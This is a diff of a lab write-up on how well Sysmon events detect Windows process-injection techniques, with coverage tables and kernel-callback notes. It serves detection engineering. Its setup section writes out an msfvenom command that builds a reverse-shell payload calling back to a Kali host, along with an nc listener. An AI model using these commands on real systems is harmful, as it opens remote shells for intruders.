@@ -4,7 +4,7 @@ at the lowest possible level below any userland bypass.
 
 ## TLDR: Final Lab Summary Process Injection Detection Coverage
 
-### EID Coverage Per Technique
+### EIDs Coverage Per Technique
 | Technique                        | EID 7 | EID 8 | EID 10 | EID 25 |
 |----------------------------------|-------|-------|--------|--------|
 | T1  Classic CRT                  | ❌    | ✅    | ✅     | ❌     |
@@ -22,35 +22,9 @@ at the lowest possible level below any userland bypass.
 | T13 AOE Injection                | ❌    | ✅    | ✅     | ❌     |
 | T14 PE Injection                 | ❌    | ✅    | ✅     | ❌     |
 
-### EID 8 Detection Gaps Techniques That Bypass It
-| Technique              | Reason EID 8 Absent                              |
-|------------------------|--------------------------------------------------|
-| T3  APC Early Bird     | QueueUserAPC reuses existing thread              |
-| T4  Process Hollowing  | No thread created, SetThreadContext used         |
-| T8  Thread Hijacking   | SuspendThread/SetThreadContext on existing thread|
-| T11 Doppelganging      | Probably not viable on Windows 11                |
-| T12 SetWindowsHookEx   | Windows message dispatcher performs injection    |
-
-### EID 7 Detection Only Fires When Windows Loader Used
-| Technique              | EID 7 | Reason                                    |
-|------------------------|-------|-------------------------------------------|
-| T6  DLL Injection      | ✅    | LoadLibraryA triggers loader callback     |
-| T10 Module Stomping    | ✅    | LoadLibraryW used to load amsi.dll        |
-| T12 SetWindowsHookEx   | ✅    | Windows loads hook DLL via loader         |
-| T7  Reflective DLL     | ❌    | Self-maps loader never called           |
-| T14 PE Injection       | ❌    | Manual mapping, loader never called      |
-
-### EID 25 Detection — Image Tampering
-| Technique              | EID 25 | Type                  | Reason                        |
-|------------------------|--------|-----------------------|-------------------------------|
-| T4  Process Hollowing  | ✅     | Image is replaced     | NtUnmapViewOfSection used     |
-| T10 Module Stomping    | ❌     | -                     | VirtualProtectEx not detected |
-| T13 AOE Injection      | ❌     | -                     | Protection change only        |
-| All others             | ❌     | -                     | No image replacement          |
-
 ---
 
-## GrantedAccess Observed Values
+### GrantedAccess Observed Values
 
 | Technique                  | Observed Value | Comment                                              |
 |----------------------------|----------------|------------------------------------------------------|
@@ -75,9 +49,7 @@ at the lowest possible level below any userland bypass.
 ### EID 7 — Image Loaded
 **Kernel callback:** `PsSetLoadImageNotifyRoutine`
 
-The Windows kernel calls
-this routine every time any PE image (EXE, DLL, driver) is mapped
-into a process address space. Fires at the memory mapping level completely independent of which API was used to load the image.
+The Windows kernel calls this routine every time any PE image (EXE, DLL, driver) is mapped into a process address space. Fires at the memory mapping level completely independent of which API was used to load the image.
 LoadLibrary, LdrLoadDll, manual mapping all produce the same callback.
 LoadLibraryA() called:
 → ntdll LdrLoadDll maps image into memory
@@ -217,22 +189,17 @@ SeDebugPrivilege which allows a process to open handles to any process regardles
 
 
 ## Lab setup
-1. Windows Host running ELK in WSL with local FW rules to push traffic to the host -> WSL
-2. Windows VM with Elastic Agent, Sysmon and sysmonconfig-olaf-filedelete.xml on bridged network
-3. Kali VM as attacking machine on bridged network
+1. Windows Host running ELK in WSL with local FW rules to push traffic to through host to WSL
+2. Windows 11 in VirtualBox with Elastic Agent, Sysmon and sysmonconfig-olaf-filedelete.xml on bridged network
+4. Kali VM as attacking machine on bridged network
 
 
-## Init common header with shellcode
+### Initialize common.h header with shellcode
 On Kali run:
 - msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.32.49 LPORT=4444 -f c -b \x00\x0a\x0d
 - nc -lvnp 4444
 
-
-## Sysmon conf updates
-- In EiD 10 exclude source image is "C:\Program Files\Elastic\Endpoint\elastic-endpoint.exe" and contains "elastic-otel-collector.exe"
-
-
-Then common header used in several of the techniques
+Then common header used for several of the techniques
 ```
 #pragma once
 #include <Windows.h>
